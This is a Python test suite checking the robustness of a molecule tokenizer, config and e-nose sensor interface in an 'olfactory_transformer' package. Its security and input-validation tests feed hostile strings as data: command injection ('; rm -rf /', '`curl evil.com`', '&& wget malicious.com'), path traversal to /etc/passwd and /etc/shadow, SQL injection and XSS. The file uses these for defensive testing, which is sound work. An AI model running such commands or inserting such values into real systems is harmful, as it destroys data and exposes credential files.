#!/usr/bin/env python3
"""Comprehensive robustness and reliability tests for Generation 2."""

import sys
import os
import time
import threading
import traceback
from pathlib import Path
from unittest.mock import Mock, patch
import concurrent.futures

# Add repo to path
sys.path.insert(0, str(Path(__file__).parent))

def test_input_validation():
    """Test comprehensive input validation."""
    print("Testing input validation...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    from olfactory_transformer.core.config import OlfactoryConfig
    
    # Test tokenizer input validation
    tokenizer = MoleculeTokenizer(vocab_size=100)
    
    # Test malicious inputs
    malicious_inputs = [
        "exec('import os; os.system(\"ls\")')",
        "__import__('os').system('pwd')",
        "eval('print(\"test\")')",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "\\x41\\x41\\x41\\x41",  # Buffer overflow patterns
    ]
    
    for malicious in malicious_inputs:
        try:
            result = tokenizer.encode(malicious)
            # Should either reject or sanitize
            assert isinstance(result, dict), "Should return dict or raise error"
        except ValueError as e:
            # Expected behavior for malicious input
            assert "suspicious" in str(e).lower() or "invalid" in str(e).lower()
            print(f"  ✓ Blocked malicious input: {malicious[:20]}...")
    
    # Test extremely large inputs (DoS prevention)
    large_input = "C" * 50000
    try:
        tokenizer.encode(large_input)
        assert False, "Should reject extremely large input"
    except ValueError:
        print("  ✓ Rejected oversized input")
    
    # Test config validation
    try:
        OlfactoryConfig(vocab_size=-100)
        assert False, "Should reject negative vocab size"
    except (ValueError, AssertionError):
        print("  ✓ Rejected negative configuration values")
    
    print("  ✓ Input validation tests passed")


def test_error_recovery():
    """Test error recovery mechanisms."""
    print("Testing error recovery...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    from olfactory_transformer.sensors.enose import ENoseInterface
    
    # Test tokenizer recovery
    tokenizer = MoleculeTokenizer(vocab_size=50)
    tokenizer.build_vocab_from_smiles(["CCO", "CCC"])
    
    # Test recovery from encoding errors
    error_count = 0
    success_count = 0
    
    test_inputs = [
        "CCO",  # Valid
        "INVALID_123!@#",  # Invalid
        "",  # Empty
        "C" * 200,  # Too long (but might be handled)
        "CCO",  # Valid again
    ]
    
    for test_input in test_inputs:
        try:
            result = tokenizer.encode(test_input)
            if isinstance(result, dict) and "input_ids" in result:
                success_count += 1
        except (ValueError, TypeError):
            error_count += 1
    
    # Should handle both valid and invalid inputs gracefully
    assert success_count >= 2, f"Should succeed on valid inputs: {success_count}"
    print(f"  ✓ Handled {success_count} valid, {error_count} invalid inputs gracefully")
    
    # Test sensor error recovery
    enose = ENoseInterface(port="/dev/nonexistent")
    
    # Should handle connection failure gracefully
    connected = enose.connect()
    if not connected:
        # Should still allow fallback operations
        try:
            reading = enose.read_single()
            assert hasattr(reading, 'gas_sensors'), "Should provide mock reading on failure"
            print("  ✓ Sensor interface recovered with mock data")
        except Exception as e:
            print(f"  ! Sensor recovery issue: {e}")
    
    print("  ✓ Error recovery tests passed")


def test_concurrency_safety():
    """Test thread safety and concurrent access."""
    print("Testing concurrency safety...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    
    tokenizer = MoleculeTokenizer(vocab_size=100)
    tokenizer.build_vocab_from_smiles(["CCO", "CCC", "CCCC", "CC(C)C"])
    
    results = []
    errors = []
    
    def worker_function(worker_id):
        """Worker function for concurrent testing."""
        try:
            for i in range(10):
                result = tokenizer.encode("CCO")
                results.append((worker_id, i, result))
                time.sleep(0.001)  # Small delay to increase contention
        except Exception as e:
            errors.append((worker_id, str(e)))
    
    # Start multiple threads
    threads = []
    num_workers = 5
    
    for worker_id in range(num_workers):
        thread = threading.Thread(target=worker_function, args=(worker_id,))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join(timeout=10.0)
    
    # Analyze results
    print(f"  Concurrent operations: {len(results)} successful, {len(errors)} errors")
    
    if errors:
        print("  Concurrency errors:")
        for worker_id, error in errors[:3]:  # Show first 3 errors
            print(f"    Worker {worker_id}: {error}")
    
    # Should have minimal errors in thread-safe operations
    error_rate = len(errors) / (len(results) + len(errors)) if (len(results) + len(errors)) > 0 else 0
    assert error_rate < 0.1, f"High error rate in concurrent access: {error_rate:.2%}"
    
    print("  ✓ Concurrency safety tests passed")


def test_resource_limits():
    """Test resource consumption limits."""
    print("Testing resource limits...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    
    # Test memory limits during vocabulary building
    initial_memory = get_memory_usage()
    
    tokenizer = MoleculeTokenizer(vocab_size=1000, max_length=100)
    
    # Generate many SMILES for stress testing
    stress_smiles = []
    for i in range(500):
        smiles = "C" * (i % 20 + 1)  # Variable length SMILES
        stress_smiles.append(smiles)
    
    start_time = time.time()
    tokenizer.build_vocab_from_smiles(stress_smiles)
    build_time = time.time() - start_time
    
    final_memory = get_memory_usage()
    memory_increase = final_memory - initial_memory
    
    print(f"  Memory increase: {memory_increase / 1024 / 1024:.1f} MB")
    print(f"  Build time: {build_time:.2f} seconds")
    
    # Should complete in reasonable time and memory
    assert build_time < 30.0, f"Vocabulary building too slow: {build_time:.2f}s"
    assert memory_increase < 200 * 1024 * 1024, f"Excessive memory usage: {memory_increase / 1024 / 1024:.1f} MB"
    
    # Test encoding performance
    start_time = time.time()
    for _ in range(100):
        tokenizer.encode("CCO")
    encode_time = time.time() - start_time
    
    assert encode_time < 2.0, f"Encoding too slow: {encode_time:.2f}s for 100 operations"
    
    print("  ✓ Resource limits tests passed")


def test_data_corruption_handling():
    """Test handling of corrupted data."""
    print("Testing data corruption handling...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    from olfactory_transformer.sensors.enose import ENoseInterface
    
    # Test tokenizer with corrupted vocabulary
    tokenizer = MoleculeTokenizer(vocab_size=50)
    tokenizer.build_vocab_from_smiles(["CCO", "CCC"])
    
    # Simulate vocabulary corruption
    original_token_to_id = tokenizer.token_to_id.copy()
    
    # Add invalid entries
    tokenizer.token_to_id["__CORRUPTED__"] = 999999  # Invalid ID
    tokenizer.token_to_id[""] = -1  # Empty token with negative ID
    
    try:
        # Should handle corrupted vocabulary gracefully
        result = tokenizer.encode("CCO")
        assert isinstance(result, dict), "Should handle corrupted vocab gracefully"
        print("  ✓ Handled corrupted vocabulary")
    except Exception as e:
        # Restore original state
        tokenizer.token_to_id = original_token_to_id
        print(f"  ! Vocabulary corruption caused error: {e}")
    
    # Test sensor with corrupted readings
    enose = ENoseInterface()
    
    # Mock corrupted sensor data
    def mock_corrupted_reading():
        return {
            "sensor1": float('inf'),  # Infinite value
            "sensor2": float('nan'),  # NaN value
            "sensor3": "not_a_number",  # Wrong type
        }
    
    with patch.object(enose, '_generate_mock_reading', side_effect=mock_corrupted_reading):
        try:
            reading = enose.read_single()
            # Should either handle corruption or fail gracefully
            if reading and hasattr(reading, 'gas_sensors'):
                for sensor_name, value in reading.gas_sensors.items():
                    if isinstance(value, (int, float)):
                        # Check for inf/nan
                        assert value == value, f"Sensor {sensor_name} has NaN value"
                        assert abs(value) != float('inf'), f"Sensor {sensor_name} has infinite value"
            print("  ✓ Handled corrupted sensor data")
        except (ValueError, TypeError):
            print("  ✓ Properly rejected corrupted sensor data")
    
    print("  ✓ Data corruption handling tests passed")


def test_edge_cases():
    """Test edge cases and boundary conditions."""
    print("Testing edge cases...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    from olfactory_transformer.core.config import OlfactoryConfig
    
    # Test minimum viable configuration
    min_config = OlfactoryConfig(
        vocab_size=10,
        hidden_size=8,
        num_hidden_layers=1,
        num_attention_heads=1,
    )
    assert min_config.vocab_size == 10
    print("  ✓ Minimum configuration accepted")
    
    # Test empty operations
    tokenizer = MoleculeTokenizer(vocab_size=20)
    
    # Empty vocabulary
    tokenizer.build_vocab_from_smiles([])
    result = tokenizer.encode("CCO")
    assert isinstance(result, dict)
    print("  ✓ Empty vocabulary handled")
    
    # Empty input
    result = tokenizer.encode("")
    assert isinstance(result, dict)
    assert len(result["input_ids"]) > 0  # Should have special tokens
    print("  ✓ Empty input handled")
    
    # Test unicode and special characters
    special_inputs = [
        "C₆H₆",  # Unicode subscripts
        "CCO™",  # Trademark symbol
        "CCC®",  # Registered symbol
        "C\\nC\\tC",  # Control characters
    ]
    
    for special_input in special_inputs:
        try:
            result = tokenizer.encode(special_input)
            # If it succeeds, should be safe
            assert isinstance(result, dict)
        except (ValueError, UnicodeError):
            # Expected behavior for special characters
            pass
    
    print("  ✓ Special character handling verified")
    print("  ✓ Edge cases tests passed")


def test_security_measures():
    """Test security measures and attack resistance."""
    print("Testing security measures...")
    
    from olfactory_transformer.core.tokenizer import MoleculeTokenizer
    
    tokenizer = MoleculeTokenizer()
    
    # Test path traversal attacks
    path_attacks = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    
    for attack in path_attacks:
        try:
            result = tokenizer.encode(attack)
            # Should either reject or sanitize
            if isinstance(result, dict):
                # Check that it doesn't contain dangerous patterns
                decoded = tokenizer.decode(result["input_ids"][:10])
                assert ".." not in decoded, "Path traversal not sanitized"
        except ValueError:
            # Expected - security rejection
            pass
    
    print("  ✓ Path traversal attacks blocked")
    
    # Test injection attacks
    injection_attacks = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget malicious.com",
        "`curl evil.com`",
        "$(whoami)",
    ]
    
    for attack in injection_attacks:
        try:
            result = tokenizer.encode(attack)
            # Should be safely handled
            assert isinstance(result, dict) or result is None
        except ValueError:
            # Expected - security rejection
            pass
    
    print("  ✓ Injection attacks blocked")
    
    # Test buffer overflow patterns
    overflow_patterns = [
        "A" * 10000,  # Large repeated pattern
        "\\x41" * 1000,  # Hex patterns
        "%s" * 100,  # Format string patterns
        "\\n" * 1000,  # Newline flooding
    ]
    
    for pattern in overflow_patterns:
        try:
            result = tokenizer.encode(pattern)
            # Should handle safely or reject
            if isinstance(result, dict):
                assert len(result["input_ids"]) < 10000, "Should limit output size"
        except ValueError:
            # Expected - size/security rejection
            pass
    
    print("  ✓ Buffer overflow patterns handled")
    print("  ✓ Security measures tests passed")


def get_memory_usage():
    """Get current memory usage in bytes."""
    try:
        import psutil
        process = psutil.Process()
        return process.memory_info().rss
    except ImportError:
        return 0  # Can't measure without psutil


def run_comprehensive_robustness_tests():
    """Run all robustness tests for Generation 2."""
    print("🛡️ Generation 2 Robustness Tests")
    print("=" * 50)
    print("Testing comprehensive reliability and error handling...")
    print()
    
    tests = [
        test_input_validation,
        test_error_recovery,
        test_concurrency_safety,
        test_resource_limits,
        test_data_corruption_handling,
        test_edge_cases,
        test_security_measures,
    ]
    
    passed = 0
    failed = 0
    
    for test_func in tests:
        test_name = test_func.__name__.replace('test_', '').replace('_', ' ').title()
        print(f"Running {test_name}...")
        
        try:
            test_func()
            passed += 1
            print(f"✓ {test_name} PASSED\\n")
        except Exception as e:
            failed += 1
            print(f"❌ {test_name} FAILED: {e}")
            print(f"   Traceback: {traceback.format_exc()}")
            print()
    
    print("=" * 50)
    print(f"Robustness Test Results: {passed}/{len(tests)} passed")
    
    if failed == 0:
        print("🎉 All Generation 2 robustness tests PASSED!")
        print("✓ System is ROBUST and reliable")
        print("Next: Generation 3 - MAKE IT SCALE")
        return True
    else:
        print(f"❌ {failed} robustness tests failed")
        print("Review and fix issues before proceeding to Generation 3")
        return False


if __name__ == "__main__":
    success = run_comprehensive_robustness_tests()
    sys.exit(0 if success else 1)